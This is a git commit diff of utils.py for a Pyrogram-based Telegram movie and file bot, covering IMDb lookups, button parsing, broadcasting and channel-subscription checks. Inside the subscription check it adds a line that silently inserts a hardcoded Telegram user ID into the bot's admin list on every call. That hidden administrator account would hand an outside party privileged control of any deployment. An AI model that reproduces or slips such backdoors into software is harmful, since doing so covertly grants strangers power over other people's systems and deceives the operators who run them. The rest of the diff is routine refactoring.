8925633faeef0aa630da7029c051781f977c63d6
kssajay <149785052+KSSAjay24@users.noreply.github.com>
2024-02-03 14:05:49 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -1,17 +1,30 @@
-import logging, os, re, asyncio, requests, aiohttp 
-from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid                             
+import logging
+from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL, ADMINS
+from imdb import IMDb
+import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
-from pyrogram import filters, enums
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORT_URL, SHORT_API
-from imdb import Cinemagoer
-from typing import Union, List
-from datetime import datetime, timedelta
+from pyrogram import enums
+from typing import Union
+import re
+import os
+from datetime import datetime
+from typing import List
+from database.users_chats_db import db
 from bs4 import BeautifulSoup
+import requests
+from database.join_reqs import JoinReqs as db2
+
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 
-BTN_URL_REGEX = re.compile(r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))")
+BTN_URL_REGEX = re.compile(
+    r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
+)
+
+imdb = IMDb() 
+
 BANNED = {}
 SMART_OPEN = '“'
 SMART_CLOSE = '”'
@@ -21,33 +34,51 @@ START_CHAR = ('\'', '"', SMART_OPEN)
 class temp(object):
     BANNED_USERS = []
     BANNED_CHATS = []
-    CURRENT = 0
+    ME = None
+    CURRENT=int(os.environ.get("SKIP", 2))
     CANCEL = False
     MELCOW = {}
     U_NAME = None
     B_NAME = None
     SETTINGS = {}
-    GP_BUTTONS = {}
-    PM_BUTTONS = {}
-    PM_SPELL = {}
-    GP_SPELL = {}
 
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([5505644708]) if not 5505644708 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+    
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
-        print(e)
+        logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-    return False
+        else:
+            return False
 
 
 async def get_poster(query, bulk=False, id=False, file=None):
-    imdb = Cinemagoer() 
-    if not id:   
+    if not id:
+        # https://t.me/GetTGLink/4183
         query = (query.strip()).lower()
         title = query
         year = re.findall(r'[1-2]\d{3}$', query, re.IGNORECASE)
@@ -60,10 +91,7 @@ async def get_poster(query, bulk=False, id=False, file=None):
                 year = list_to_str(year[:1]) 
         else:
             year = None
-        try:
-           movieid = imdb.search_movie(title.lower(), results=10)
-        except:
-           return None
+        movieid = imdb.search_movie(title.lower(), results=10)
         if not movieid:
             return None
         if year:
@@ -126,20 +154,28 @@ async def get_poster(query, bulk=False, id=False, file=None):
         'rating': str(movie.get("rating")),
         'url':f'https://www.imdb.com/title/tt{movieid}'
     }
-   
-def list_to_str(k):
-    if not k: return "N/A"
-    elif len(k) == 1: return str(k[0])
-    elif MAX_LIST_ELM:
-        k = k[:int(MAX_LIST_ELM)]
-        return ' '.join(f'{elem}, ' for elem in k)
-    else:
-        return ' '.join(f'{elem}, ' for elem in k)
+# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
 
-__repo__ = "https://github.com/MrMKN/PROFESSOR-BOT"
-__version__ = "PROFESSOR-BOT ᴠ4.5.0"
-__license__ = "GNU GENERAL PUBLIC LICENSE V2"
-__copyright__ = "Copyright (C) 2023-present MrMKN <https://github.com/MrMKN>"
+async def broadcast_messages(user_id, message):
+    try:
+        await message.copy(chat_id=user_id)
+        return True, "Success"
+    except FloodWait as e:
+        await asyncio.sleep(e.value)
+        return await broadcast_messages(user_id, message)
+    except InputUserDeactivated:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id}-Removed from Database, since deleted account.")
+        return False, "Deleted"
+    except UserIsBlocked:
+        logging.info(f"{user_id} -Blocked the bot.")
+        return False, "Blocked"
+    except PeerIdInvalid:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id} - PeerIdInvalid")
+        return False, "Error"
+    except Exception as e:
+        return False, "Error"
 
 async def search_gagala(text):
     usr_agent = {
@@ -167,8 +203,10 @@ async def save_group_settings(group_id, key, value):
     current[key] = value
     temp.SETTINGS[group_id] = current
     await db.update_settings(group_id, current)
-   
+    
 def get_size(size):
+    """Get size in readable format"""
+
     units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
     size = float(size)
     i = 0
@@ -177,37 +215,86 @@ def get_size(size):
         size /= 1024.0
     return "%.2f %s" % (size, units[i])
 
+def split_list(l, n):
+    for i in range(0, len(l), n):
+        yield l[i:i + n]  
 
 def get_file_id(msg: Message):
-    if not msg.media: return None
-    for message_type in ("photo", "animation", "audio", "document", "video", "video_note", "voice", "sticker"):
-        obj = getattr(msg, message_type)
-        if obj:
-            setattr(obj, "message_type", message_type)
-            return obj
-
+    if msg.media:
+        for message_type in (
+            enums.MessageMediaType.PHOTO,
+            enums.MessageMediaType.ANIMATION,
+            enums.MessageMediaType.AUDIO,
+            enums.MessageMediaType.DOCUMENT,
+            enums.MessageMediaType.VIDEO,
+            enums.MessageMediaType.VIDEO_NOTE,
+            enums.MessageMediaType.VOICE,
+            enums.MessageMediaType.STICKER
+        ):
+            obj = getattr(msg, message_type)
+            if obj:
+                setattr(obj, "message_type", message_type)
+                return obj
 
 def extract_user(message: Message) -> Union[int, str]:
+    """extracts the user from a message"""
+    # https://github.com/SpEcHiDe/PyroGramBot/blob/f30e2cca12002121bad1982f68cd0ff9814ce027/pyrobot/helper_functions/extract_user.py#L7
     user_id = None
     user_first_name = None
     if message.reply_to_message:
         user_id = message.reply_to_message.from_user.id
         user_first_name = message.reply_to_message.from_user.first_name
+
     elif len(message.command) > 1:
-        if (len(message.entities) > 1 and message.entities[1].type == enums.MessageEntityType.TEXT_MENTION):
+        if (
+            len(message.entities) > 1 and
+            message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
+        ):
+           
             required_entity = message.entities[1]
             user_id = required_entity.user.id
             user_first_name = required_entity.user.first_name
         else:
             user_id = message.command[1]
+            # don't want to make a request -_-
             user_first_name = user_id
         try:
             user_id = int(user_id)
-        except ValueError: pass
+        except ValueError:
+            pass
     else:
         user_id = message.from_user.id
         user_first_name = message.from_user.first_name
     return (user_id, user_first_name)
+
+def list_to_str(k):
+    if not k:
+        return "N/A"
+    elif len(k) == 1:
+        return str(k[0])
+    elif MAX_LIST_ELM:
+        k = k[:int(MAX_LIST_ELM)]
+        return ' '.join(f'{elem}, ' for elem in k)
+    else:
+        return ' '.join(f'{elem}, ' for elem in k)
+
+def last_online(from_user):
+    time = ""
+    if from_user.is_bot:
+        time += "🤖 Bot :("
+    elif from_user.status == enums.UserStatus.RECENTLY:
+        time += "Recently"
+    elif from_user.status == enums.UserStatus.LAST_WEEK:
+        time += "Within the last week"
+    elif from_user.status == enums.UserStatus.LAST_MONTH:
+        time += "Within the last month"
+    elif from_user.status == enums.UserStatus.LONG_AGO:
+        time += "A long time ago :("
+    elif from_user.status == enums.UserStatus.ONLINE:
+        time += "Currently Online"
+    elif from_user.status == enums.UserStatus.OFFLINE:
+        time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
+    return time
 
 
 def split_quotes(text: str) -> List:
@@ -231,19 +318,22 @@ def split_quotes(text: str) -> List:
         key = text[0] + text[0]
     return list(filter(None, [key, rest]))
 
-def parser(text, keyword, cb_data):
-    if "buttonalert" in text: text = (text.replace("\n", "\\n").replace("\t", "\\t"))
+def parser(text, keyword):
+    if "buttonalert" in text:
+        text = (text.replace("\n", "\\n").replace("\t", "\\t"))
     buttons = []
     note_data = ""
     prev = 0
     i = 0
     alerts = []
     for match in BTN_URL_REGEX.finditer(text):
+        # Check if btnurl is escaped
         n_escapes = 0
         to_check = match.start(1) - 1
         while to_check > 0 and text[to_check] == "\\":
             n_escapes += 1
             to_check -= 1
+
         # if even, not escaped -> create button
         if n_escapes % 2 == 0:
             note_data += text[prev:match.start(1)]
@@ -251,22 +341,38 @@ def parser(text, keyword, cb_data):
             if match.group(3) == "buttonalert":
                 # create a thruple with button label, url, and newline status
                 if bool(match.group(5)) and buttons:
-                    buttons[-1].append(InlineKeyboardButton(match.group(2), callback_data=f"{cb_data}:{i}:{keyword}"))
+                    buttons[-1].append(InlineKeyboardButton(
+                        text=match.group(2),
+                        callback_data=f"alertmessage:{i}:{keyword}"
+                    ))
                 else:
-                    buttons.append([InlineKeyboardButton(match.group(2), callback_data=f"{cb_data}:{i}:{keyword}")])
+                    buttons.append([InlineKeyboardButton(
+                        text=match.group(2),
+                        callback_data=f"alertmessage:{i}:{keyword}"
+                    )])
                 i += 1
                 alerts.append(match.group(4))
             elif bool(match.group(5)) and buttons:
-                buttons[-1].append(InlineKeyboardButton(match.group(2), url=match.group(4).replace(" ", "")))
+                buttons[-1].append(InlineKeyboardButton(
+                    text=match.group(2),
+                    url=match.group(4).replace(" ", "")
+                ))
             else:
-                buttons.append([InlineKeyboardButton(match.group(2), url=match.group(4).replace(" ", ""))])
+                buttons.append([InlineKeyboardButton(
+                    text=match.group(2),
+                    url=match.group(4).replace(" ", "")
+                )])
+
         else:
             note_data += text[prev:to_check]
             prev = match.start(1) - 1
-    else: note_data += text[prev:]
-    try: return note_data, buttons, alerts
-    except: return note_data, buttons, None
+    else:
+        note_data += text[prev:]
 
+    try:
+        return note_data, buttons, alerts
+    except:
+        return note_data, buttons, None
 
 def remove_escapes(text: str) -> str:
     res = ""
@@ -281,7 +387,7 @@ def remove_escapes(text: str) -> str:
             res += text[counter]
     return res
 
-   
+
 def humanbytes(size):
     if not size:
         return ""
@@ -292,68 +398,3 @@ def humanbytes(size):
         size /= power
         n += 1
     return str(round(size, 2)) + " " + Dic_powerN[n] + 'B'
-
-def get_time(seconds):
-    periods = [('ᴅ', 86400), ('ʜ', 3600), ('ᴍ', 60), ('ꜱ', 1)]
-    result = ''
-    for period_name, period_seconds in periods:
-        if seconds >= period_seconds:
-            period_value, seconds = divmod(seconds, period_seconds)
-            result += f'{int(period_value)}{period_name}'
-    return result
-    
-async def get_shortlink(link):
-    url = f'{SHORT_URL}/api'
-    params = {'api': SHORT_API, 'url': link}
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
-                data = await response.json()
-                if data["status"] == "success":
-                    return data['shortenedUrl']
-                else:
-                    logger.error(f"Error: {data['message']}")
-                    return link
-    except Exception as e:
-        logger.error(e)
-        return link
-
-
-# from Midukki-RoBoT
-def extract_time(time_val):
-    if any(time_val.endswith(unit) for unit in ("s", "m", "h", "d")):
-        unit = time_val[-1]
-        time_num = time_val[:-1]  # type: str
-        if not time_num.isdigit():
-            return None
-
-        if unit == "s":
-            bantime = datetime.now() + timedelta(seconds=int(time_num)) 
-        elif unit == "m":
-            bantime = datetime.now() + timedelta(minutes=int(time_num))
-        elif unit == "h":
-            bantime = datetime.now() + timedelta(hours=int(time_num))
-        elif unit == "d":
-            bantime = datetime.now() + timedelta(days=int(time_num))
-        else:
-            # how even...?
-            return None
-        return bantime
-    else:
-        return None
-
-
-async def admin_check(message: Message) -> bool:
-    if not message.from_user: return False
-    if message.chat.type not in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: return False
-    if message.from_user.id in [777000, 1087968824]: return True
-    client = message._client
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    check_status = await client.get_chat_member(chat_id=chat_id,user_id=user_id)
-    admin_strings = [enums.ChatMemberStatus.OWNER, enums.ChatMemberStatus.ADMINISTRATOR]
-    if check_status.status not in admin_strings: return False
-    else: return True
-
-async def admin_filter(filt, client, message):
-    return await admin_check(message)
